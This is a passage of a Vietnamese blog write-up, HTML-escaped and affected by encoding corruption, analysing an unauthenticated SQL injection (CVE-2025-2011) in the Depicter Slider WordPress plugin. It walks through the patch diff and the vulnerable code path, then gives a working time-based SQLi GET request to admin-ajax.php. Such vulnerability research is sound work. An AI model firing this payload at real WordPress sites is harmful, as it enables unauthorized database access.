1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Depicter Slider&lt;/strong&gt;:  v3.6.1(vul) v√† v3.6.2(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ &lt;strong&gt;GET&lt;/strong&gt; request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file &lt;strong&gt;app/src/Controllers/Ajax/LeadsAjaxController.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;index&lt;/code&gt;, &lt;code&gt;list&lt;/code&gt;, &lt;code&gt;export&lt;/code&gt; l√† 3 h√†m ƒë√°ng ch√∫ √Ω n·∫±m trong class &lt;code&gt;LeadsAjaxController&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function index(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;         =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        // other logic&#xA;    ];&#xA;&#xA;    $response   = \Depicter::lead()-&amp;gt;get($args);&#xA;    $statusCode = isset($response[&amp;#39;errors&amp;#39;]) ? 400 : 200;&#xA;&#xA;    return \Depicter::json($response)-&amp;gt;withStatus($statusCode);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function list(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;                =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        // other logic&#xA;    ];&#xA;&#xA;    $response = \Depicter::leadRepository()-&amp;gt;getResults($args);&#xA;&#xA;    return \Depicter::json($response);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function export(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;                =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        // other logic&#xA;    ];&#xA;&#xA;    $response = \Depicter::leadRepository()-&amp;gt;getResults($args);&#xA;&#xA;    // other logic&#xA;&#xA;    return \Depicter::json([&#xA;        &amp;#39;errors&amp;#39; =&amp;gt; [__(&amp;#39;error occurred during the export process&amp;#39;, &amp;#39;depicter&amp;#39;)]&#xA;    ])-&amp;gt;withStatus(400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C·∫£ 3 h√†m ƒë·ªÅu ƒë∆∞·ª£c v√° b·∫±ng c√°ch s·ª≠ d·ª•ng &lt;code&gt;Sanitize::sql&lt;/code&gt; thay cho &lt;code&gt;Sanitize::textfield&lt;/code&gt; nh·∫±m ƒë·∫£m b·∫£o param &lt;code&gt;&#39;s&#39;&lt;/code&gt; ƒë∆∞·ª£c l√†m s·∫°ch v√† escape ph√π h·ª£p cho ng·ªØ c·∫£nh c√¢u l·ªánh SQL.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/patch_dif.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;·∫¢nh minh h·ªça s·ª± kh√°c bi·ªát b·∫£n v√° v√† b·∫£n l·ªói&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒê·ªÉ hi·ªÉu r√µ h∆°n ch·ª©c nƒÉng c·ªßa &lt;code&gt;textfield&lt;/code&gt; v√† &lt;code&gt;sql&lt;/code&gt; ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;function textfield&lt;/code&gt;, c√≥ l·∫Ω ch√∫ng ƒë∆∞·ª£c ƒë·∫∑t trong c√πng 1 file v√¨ ƒë∆∞·ª£c g·ªçi b·∫±ng c√πng 1 class &lt;code&gt;Sanitize&lt;/code&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;N·∫øu b·∫°n ƒë√£ c√†i &lt;strong&gt;PHP Intelephense Extension&lt;/strong&gt; trong &lt;strong&gt;vscode&lt;/strong&gt;, b·∫°n c√≥ th·ªÉ di chuy·ªÉn ƒë·∫øn h√†m c·ª• th·ªÉ b·∫±ng c√°ch &lt;kbd&gt;Ctrl&lt;/kbd&gt; &lt;kbd&gt;+&lt;/kbd&gt; &lt;kbd&gt;Click&lt;/kbd&gt; v√†o h√†m c·∫ßn ƒë·∫øn.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_1.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;T√¨m ki·∫øm h√†m textfield trong class Sanitize&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;textfield&lt;/code&gt; tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c &lt;strong&gt;sanitize&lt;/strong&gt; b·∫±ng &lt;code&gt;sanitize_text_field&lt;/code&gt;, &lt;code&gt;sql&lt;/code&gt; c≈©ng l√† h√†m trong c√πng class, tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c &lt;strong&gt;escape SQL&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function sql( $input )&#xA;{&#xA;    return esc_sql( $input );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V√¨ ƒë√¢y l√† l·ªó h·ªïng &lt;strong&gt;unauthenticated&lt;/strong&gt;, vi·ªác c√≥ 3 h√†m nh∆∞ n√†y, ta c·∫ßn x√°c ƒë·ªãnh xem ƒëi·ªÉm g·ªçi ƒë·∫øn ch√∫ng c√≥ c∆° ch·∫ø x√°c th·ª±c hay kh√¥ng. Ch·ªâ sau khi ch·∫Øc ch·∫Øn r·∫±ng h√†m n√†o th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi trong b·ªëi c·∫£nh kh√¥ng y√™u c·∫ßu x√°c th·ª±c, ta m·ªõi ti·∫øp t·ª•c ph√¢n t√≠ch ph·∫ßn logic b√™n trong ƒë·ªÉ ki·ªÉm tra kh·∫£ nƒÉng g√¢y ra SQL Injection gi√∫p gi·ªõi h·∫°n ph·∫°m vi truy v·∫øt.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ x√°c ƒë·ªãnh 3 h√†m tr√™n ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp theo t√™n h√†m. Tuy nhi√™n, c√°c t·ª´ kh√≥a nh∆∞ &lt;code&gt;index&lt;/code&gt;, &lt;code&gt;list&lt;/code&gt;, hay &lt;code&gt;export&lt;/code&gt; l·∫°i qu√° ph·ªï bi·∫øn n√™n k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω r·∫•t nhi·ªÅu v√† kh√≥ l·ªçc. V√¨ v·∫≠y, thay v√¨ t√¨m theo t√™n h√†m, ta t√¨m v·ªõi t·ª´ kh√≥a l√† t√™n class &lt;code&gt;LeadsAjaxController&lt;/code&gt;. B·ªüi l·∫Ω khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c h√†m n√†y ƒë·ªÅu ph·∫£i ƒë∆∞·ª£c g·ªçi th√¥ng qua class, nh·ªù ƒë√≥ ph·∫°m vi k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω ƒë∆∞·ª£c thu h·∫πp v√† d·ªÖ d√†ng h∆°n.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_2.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;K·∫øt qu·∫£ t√¨m ki·∫øm LeadsAjaxController trong m√£ ngu·ªìn&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ &lt;code&gt;LeadsAjaxController&lt;/code&gt; ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh ƒëƒÉng k√Ω &lt;strong&gt;route Ajax&lt;/strong&gt;. Khi c√≥ request g·ª≠i t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php?action=action_here&amp;amp;param1=param1_here&amp;amp;paramN=paramN_here&lt;/code&gt;, h·ªá th·ªëng s·∫Ω d·ª±a tr√™n khai b√°o &lt;code&gt;handle(&#39;LeadsAjaxController@function&#39;)&lt;/code&gt; ƒë·ªÉ g·ªçi t·ªõi ph∆∞∆°ng th·ª©c t∆∞∆°ng ·ª©ng trong class &lt;code&gt;LeadsAjaxController&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;C·∫£ ba h√†m ta ƒëang &lt;strong&gt;focus&lt;/strong&gt; ƒë·ªÅu ƒë∆∞·ª£c g·ªçi b·∫±ng ph∆∞∆°ng th·ª©c &lt;strong&gt;GET&lt;/strong&gt;, nh∆∞ng &lt;code&gt;export&lt;/code&gt; l·∫°i c√≥ &lt;strong&gt;middleware&lt;/strong&gt; x·ª≠ l√Ω &lt;code&gt;csrf-api&lt;/code&gt;, n√™n ta b·ªè qua. Ch·ªâ truy v·∫øt &lt;code&gt;index&lt;/code&gt; v√† &lt;code&gt;list&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi ph√¢n t√≠ch hai h√†m n√†y, ta th·∫•y trong h√†m &lt;code&gt;index&lt;/code&gt;, bi·∫øn &lt;code&gt;$response&lt;/code&gt; ƒë∆∞·ª£c g√°n gi√° tr·ªã t·ª´ &lt;code&gt;\Depicter::lead()-&amp;gt;get($args)&lt;/code&gt;. Tuy nhi√™n, ph∆∞∆°ng th·ª©c &lt;code&gt;get()&lt;/code&gt; l·∫°i ti·∫øp t·ª•c g·ªçi ƒë·∫øn &lt;code&gt;\Depicter::leadRepository()-&amp;gt;getResults($args)&lt;/code&gt;, t·ª©c l√† c√πng m·ªôt logic m√† h√†m &lt;code&gt;list&lt;/code&gt; ƒë√£ g·ªçi tr·ª±c ti·∫øp. Do ƒë√≥, ta ch·ªçn h√†m &lt;code&gt;list&lt;/code&gt; l√†m ƒëi·ªÉm truy v·∫øt ch√≠nh.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function list(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;                =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;ids&amp;#39;              =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;ids&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;sources&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;sources&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;dateStart&amp;#39;        =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;dateStart&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;dateEnd&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;dateEnd&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;order&amp;#39;            =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;order&amp;#39;, &amp;#39;DESC&amp;#39;)),&#xA;        &amp;#39;orderBy&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;orderBy&amp;#39;, &amp;#39;id&amp;#39;)),&#xA;        &amp;#39;page&amp;#39;             =&amp;gt; Sanitize::int($request-&amp;gt;query(&amp;#39;page&amp;#39;, 1)),&#xA;        &amp;#39;perPage&amp;#39;          =&amp;gt; Sanitize::int($request-&amp;gt;query(&amp;#39;perpage&amp;#39;, 10)),&#xA;        &amp;#39;columns&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;columns&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;includeFields&amp;#39;    =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;includeFields&amp;#39;, false)),&#xA;        &amp;#39;skipCustomFields&amp;#39; =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;skipCustomFields&amp;#39;, false))&#xA;    ];&#xA;&#xA;    $response = \Depicter::leadRepository()-&amp;gt;getResults($args);&#xA;&#xA;    return \Depicter::json($response);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·ªÉ bi·∫øt &lt;code&gt;getResults&lt;/code&gt; th·ª±c thi query nh∆∞ n√†o, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;function getResults&lt;/code&gt; ho·∫∑c &lt;kbd&gt;Ctrl&lt;/kbd&gt; &lt;kbd&gt;+&lt;/kbd&gt; &lt;kbd&gt;Click&lt;/kbd&gt; v√†o &lt;code&gt;getResults&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_3.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;V·ªã tr√≠ ƒë·ªãnh nghƒ©a h√†m getResults trong LeadRepository&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ Khi t√¨m ki·∫øm, ta th·∫•y k·∫øt qu·∫£ c√≥ hai h√†m &lt;code&gt;getResults&lt;/code&gt;. D·ª±a v√†o t√™n class c√≥ th·ªÉ nh·∫≠n th·∫•y s·ª± li√™n quan gi·ªØa class &lt;code&gt;LeadRepository&lt;/code&gt; v√† h√†m &lt;code&gt;leadRepository()&lt;/code&gt;, nhi·ªÅu kh·∫£ nƒÉng &lt;code&gt;Depicter::leadRepository()&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ m·ªôt &lt;strong&gt;instance&lt;/strong&gt; c·ªßa class &lt;strong&gt;LeadRepository&lt;/strong&gt;. B√™n c·∫°nh ƒë√≥, ta c√≥ th·ªÉ d·ª±a v√†o s·ªë l∆∞·ª£ng tham s·ªë truy·ªÅn v√†o ƒë·ªÉ x√°c ƒë·ªãnh ch√≠nh x√°c h√†m &lt;strong&gt;getResults&lt;/strong&gt; n√†o m·ªõi l√† h√†m c·∫ßn ph√¢n t√≠ch.&lt;/p&gt;&#xA;&lt;p&gt;Ta th·∫•y ƒëi·ªÅu ki·ªán &lt;code&gt;if&lt;/code&gt;,khi kh√¥ng c√≥ param &lt;code&gt;includeFields&lt;/code&gt; th√¨ &lt;code&gt;getLeadsResults&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi, quan s√°t &lt;code&gt;getLeadsResults&lt;/code&gt; trong c√πng class:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function getLeadsResults( $args ){&#xA;    // Purpose of joining tables is being able to search in leadField values as well&#xA;    $leadTable = $this-&amp;gt;lead()-&amp;gt;getTable();&#xA;    $leads = Lead::new()-&amp;gt;select(&#xA;        &amp;#34;{$leadTable}.id&amp;#34;,&#xA;        &amp;#34;{$leadTable}.source_id&amp;#34;,&#xA;        &amp;#34;{$leadTable}.content_id&amp;#34;,&#xA;        &amp;#34;{$leadTable}.content_name&amp;#34;,&#xA;        &amp;#34;{$leadTable}.created_at&amp;#34;,&#xA;        &amp;#34;lf.name as fieldName&amp;#34;,&#xA;        &amp;#34;lf.value as fieldValue&amp;#34;&#xA;    )-&amp;gt;join( &amp;#34;{$this-&amp;gt;leadField()-&amp;gt;getTable()} AS lf&amp;#34;, &amp;#34;{$leadTable}.id&amp;#34;, &amp;#34;=&amp;#34;, &amp;#34;lf.lead_id&amp;#34; );&#xA;&#xA;    // other logic&#xA;&#xA;    if( ! empty( $args[&amp;#39;s&amp;#39;] ) ){&#xA;        $search = &amp;#34;&amp;#39;%&amp;#34;. $args[&amp;#39;s&amp;#39;] .&amp;#34;%&amp;#39;&amp;#34;;&#xA;        $leads-&amp;gt;appendRawWhere(&amp;#39;AND&amp;#39;, &amp;#34;( lf.value like {$search} OR {$leadTable}.content_name like {$search} )&amp;#34;);&#xA;    }&#xA;&#xA;    $results = $this-&amp;gt;paginate( $leads, $args );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta th·∫•y param &lt;code&gt;s&lt;/code&gt;, n∆°i ƒë∆∞·ª£c b·∫£n v√° b·∫£o v·ªá ƒë√£ ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o c√¢u query b·∫±ng h√†m &lt;code&gt;appendRawWhere&lt;/code&gt;. Khi ƒë√≥ 1 ph·∫ßn query t∆∞∆°ng ·ª©ng s·∫Ω l√†:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;AND (lf.value like &amp;#39;%s_here%&amp;#39; OR leadtable.content_name like &amp;#39;%s_here%&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ Nh∆∞ v·∫≠y khi g·ª≠i &lt;strong&gt;GET request&lt;/strong&gt; ƒë·∫øn &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi params:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=depicter-lead-index&amp;amp;s=payload_here&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;list&lt;/code&gt; ƒë∆∞·ª£c g·ªçi v·ªõi duy nh·∫•t param &lt;code&gt;s&lt;/code&gt; ƒë∆∞·ª£c th√™m v√†o &lt;code&gt;$args&lt;/code&gt;, c√≤n l·∫°i ƒë∆∞·ª£c set gi√° tr·ªã m·∫∑c ƒë·ªãnh&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;getResults&lt;/code&gt; ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë &lt;code&gt;$args&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;ƒêi·ªÅu ki·ªán &lt;code&gt;if( ! $args[&#39;includeFields&#39;] )&lt;/code&gt; trong &lt;code&gt;getResults&lt;/code&gt; khi &lt;code&gt;includeFields&lt;/code&gt; m·∫∑c ƒë·ªãnh l√† &lt;code&gt;false&lt;/code&gt; =&amp;gt; &lt;code&gt;getLeadsResults&lt;/code&gt; ƒë∆∞·ª£c g·ªçi&lt;/li&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán truy v·∫•n g√¢y l·ªói SQLi&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i &lt;strong&gt;GET request&lt;/strong&gt; ch·ª©a payload SQLi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=depicter-lead-list&amp;amp;s=999%25&amp;#39;&amp;#43;AND&amp;#43;(SELECT&amp;#43;1&amp;#43;FROM&amp;#43;(SELECT&amp;#43;SLEEP(5))a))&amp;#43;--&amp;#43;-&amp;#43; HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Payload ƒë∆∞·ª£c decode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;999%&amp;#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- -&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒë√≥ m·ªôt ph·∫ßn c·ªßa c√¢u query tr·ªü th√†nh&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;AND (lf.value like &amp;#39;999%&amp;#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- &amp;#39; OR leadtable.content_name like &amp;#39;999%&amp;#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/resp_time.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Th·ªùi gian ph·∫£n h·ªìi th·ªÉ hi·ªán payload ho·∫°t ƒë·ªông&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =&amp;gt; payload ho·∫°t ƒë·ªông.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Subquery trong m·ªánh ƒë·ªÅ FROM&lt;/strong&gt;: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh.&lt;/p&gt;&#xA;&lt;h3 